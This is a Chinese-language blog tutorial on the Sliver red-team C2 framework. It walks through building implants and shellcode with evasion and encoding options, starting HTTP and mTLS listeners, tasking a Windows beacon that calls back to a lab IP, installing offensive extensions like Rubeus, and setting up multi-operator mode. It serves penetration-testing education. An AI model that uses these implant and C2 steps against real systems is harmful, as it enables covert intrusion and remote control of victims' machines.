---
title: Sliver
url: https://misakikata.github.io/2023/01/Sliver/
source: Misaki's Blog
date: 2023-01-13
fetch_date: 2025-10-04T03:42:44.547546
---

# Sliver

[Misaki's Blog](/)

Toggle navigation

* [archives](/archives/)
* [about](/about/)

# Sliver

**Thursday, January 12th 2023, 4:55 pm**

## Sliver

Sliver 是一个开源的跨平台红队框架。Sliver 的植入物支持 C2 over Mutual TLS (mTLS)、WireGuard、HTTP(S) 和 DNS，并使用每个二进制非对称加密密钥进行动态编译。

### 编译安装

可以直接到地址下载编译后的使用：<https://github.com/BishopFox/sliver/releases>

这里我们从源码编译，先下载源码

```
git clone https://github.com/BishopFox/sliver.git
cd sliver
```

运行目录下的文件来下载所需要的资源文件

```
./go-assets.sh
```

直接执行make编译命令会生成构建平台的可执行文件

```
make
​
make macos    //指定编译平台
make macos-arm64
make linux
make windows
```

### 生成

目录下会生成两个文件sliver-server、sliver-client。运行server，是一个交互命令行，下面生成一个beacon。除了beacon还可以使用session。

```
[server] sliver > generate beacon --http 192.168.111.128 --save .
​
[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 2m55s
[*] Implant saved to /home/user/sliver/ARROGANT_GERBIL.exe
​
​
//如果不使用beacon则生成一个session的二进制文件
[server] sliver (SPLENDID_BEHEADING) > generate --mtls 192.168.111.128 --save . --os windows
​
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m23s
[*] Implant saved to /home/user/sliver/PATIENT_WEEKENDER.exe
```

不过需要注意的是，sliver只是生成载荷和shellcode，它不能绕过杀软，也不具备免杀功能。

将生成的文件上传到测试机，这里我们先需要一个监听端，可以使用CS或Empire监听，也可以使用自带的命令运行监听，则默认在80端口运行监听。

```
[server] sliver > http
​
[*] Starting HTTP :80 listener ...
[*] Successfully started job #1
```

然后运行生成的文件可以获取到

```
[server] sliver > beacons
​
 ID         Name                Transport   Username   Operating System   Last Check-In   Next Check-In
========== =================== =========== ========== ================== =============== ===============
 7bbd5d50   SPLENDID_BEHEADING   http(s)     user       windows/amd64      41s             41s
```

选择这个shell，根据上面的id进行Tab补全即可。

```
[server] sliver > use 7bbd5d50-5f7f-4915-9de4-785fc9e2eb5e
​
[*] Active beacon SPLENDID_BEHEADING (7bbd5d50-5f7f-4915-9de4-785fc9e2eb5e)
​
[server] sliver (SPLENDID_BEHEADING) >
​
```

当我们执行命令的时候会显示如下，意思是命令执行需要等待检测包的时间，默认是一分钟，也就是最多一分钟就可以收到结果。

```
[server] sliver (SPLENDID_BEHEADING) > ls
​
[*] Tasked beacon SPLENDID_BEHEADING (63e4e837)
```

等待时间后会自动显示，如果认为一分钟太久则需要在生成时设置时间`--seconds 5 --jitter 3`

```
[server] sliver (SPLENDID_BEHEADING) >

[+] SPLENDID_BEHEADING completed task 63e4e837

C:\Users\user\new (4 items, 19.8 MiB)
=====================================
-rw-rw-rw-  McpManagementPotato.exe  13.5 KiB  Thu Dec 29 15:38:23 +0800 2022
-rw-rw-rw-  PrinterNotifyPotato.exe  10.0 KiB  Thu Dec 29 15:38:17 +0800 2022
-rw-rw-rw-  SPLENDID_BEHEADING.exe   17.7 MiB  Thu Dec 29 17:12:42 +0800 2022
-rw-rw-rw-  VisualStudioSetup.exe    2.0 MiB   Thu Dec 29 14:21:53 +0800 2022
```

查看运行过的命令和结果

```
[server] sliver (SPLENDID_BEHEADING) > tasks    #查看运行的命令

 ID         State       Message Type   Created                         Sent                            Completed
========== =========== ============== =============================== =============================== ===============================
 63e4e837   completed   Ls             Thu, 29 Dec 2022 17:30:49 CST   Thu, 29 Dec 2022 17:31:41 CST   Thu, 29 Dec 2022 17:31:41 CST

[server] sliver (SPLENDID_BEHEADING) > tasks fetch 63e4e837   #查看对应命令的结果

+------------------------------------------------------+
| Beacon Task   | 63e4e837-993f-4849-bed3-4ae4446e3aef |
+---------------+--------------------------------------+
| State         | ✅ Completed                         |
| Description   | LsReq                                |
| Created       | Thu, 29 Dec 2022 17:30:49 CST        |
| Sent          | Thu, 29 Dec 2022 17:31:41 CST        |
| Completed     | Thu, 29 Dec 2022 17:31:41 CST        |
| Request Size  | 18 B                                 |
| Response Size | 223 B                                |
+------------------------------------------------------+

C:\Users\user\new (4 items, 19.8 MiB)
=====================================
-rw-rw-rw-  McpManagementPotato.exe  13.5 KiB  Thu Dec 29 15:38:23 +0800 2022
-rw-rw-rw-  PrinterNotifyPotato.exe  10.0 KiB  Thu Dec 29 15:38:17 +0800 2022
-rw-rw-rw-  SPLENDID_BEHEADING.exe   17.7 MiB  Thu Dec 29 17:12:42 +0800 2022
-rw-rw-rw-  VisualStudioSetup.exe    2.0 MiB   Thu Dec 29 14:21:53 +0800 2022
```

使用`-k`来清理进程。Sliver有很多命令跟msf类似，比如execute-assembly、migrate、getsystem等。

### 配置项

利用配置生成，当需要多次重复的使用同一命令时，可以编辑一个配置文件来使用。

```
profiles new beacon --arch amd64 --os windows --mtls 192.168.111.128:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 3 test
```

其中一些参数的意义，其他参数可以使用`help profiles new beacon`查看。

```
--mtls 代表指定的监听协议，有mtls、http、dns、wg
--evasion  启动规避功能
--jitter   以秒為單位的信標間隔抖動
--seconds  信标间隔时长
```

使用以下命令来利用此配置文件生成shellcode，中间会询问是否使用编码，可以使用也可以不使用。

```
[server] sliver (SPLENDID_BEHEADING) > profiles generate --save . test

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 2m32s
? Encode shellcode with shikata ga nai? Yes
[*] Encoding shellcode with shikata ga nai ... success!
[*] Implant saved to /home/user/sliver/STEEP_FOOT.bin
```

### 监听

除了上面提到过的监听命令，监听的端口都是默认的端口。还可以指定端口进行监听

```
[server] sliver (PATIENT_WEEKENDER) > mtls --lhost 192.168.111.128 --lport 3344

[*] Starting mTLS listener ...

[*] Successfully started job #4

[server] sliver (PATIENT_WEEKENDER) > jobs

 ID   Name   Protocol   Port
==== ====== ========== ======
 1    http   tcp        80
 2    mtls   tcp        8888
 3    wg     udp        53
 4    mtls   tcp        3344
```

只不过生成的时候需要指定端口，比如

```
generate beacon --http 10.10.69.24:8800 --save .
```

### 军械库

在sliver中有一个用来安装扩展的功能，类似CS的script manager。

可以使用`armory install all`来安装全部包，但是也可以安装对应需要的包，使用前需要先运行`armory`来更新库的地址。

库地址：<https://github.com/sliverarmory/armory/blob/master/armory.json>

```
armory install rubeus
```

### 多人联动

sliver也提供了类似CS的服务端和客户端登陆的联动模式，这个功能需要服务的来启动，不然客户端无法连接。

```
[server] sliver > new-operator --name moloch --lhost 192.168.111.128

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/user/sliver/moloch_192.168.111.128.cfg

[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

生成的配置文件由客户端拿来使用即可，可以导入到客户端的配置目录中`~/.sliver-client/configs/`

```
./sliver-client import moloch_192.168.111.128.cfg
```

导入后直接运行sliver-client就行。

### 参考文章

<https://notateamserver.xyz/sliver-101/>

<https://dominicbreuker.com/post/learning_sliver_c2_01_installation/>

原文作者：[Misaki](https://misakikata.github.io)

原文链接：<https://misakikata.github.io/2023/01/Sliver/>

发表日期：[January 12th 2023, 4:55:14 pm](https://misakikata.github.io/2023/01/Sliver/)

更新日期：[January 12th 2023, 4:55:14 pm](https://misakikata.github.io/2023/01/Sliver/)

版权声明：本文采用[知识共享署名-非商业性使用 4.0 国际许可协议](http://creativecommons.org/licenses/by-nc/4.0/)进行许可

# 渗透测试

*toc*Toc:

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

**假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！**

[**Material-T**](https://github.com/0x2e/Material-T)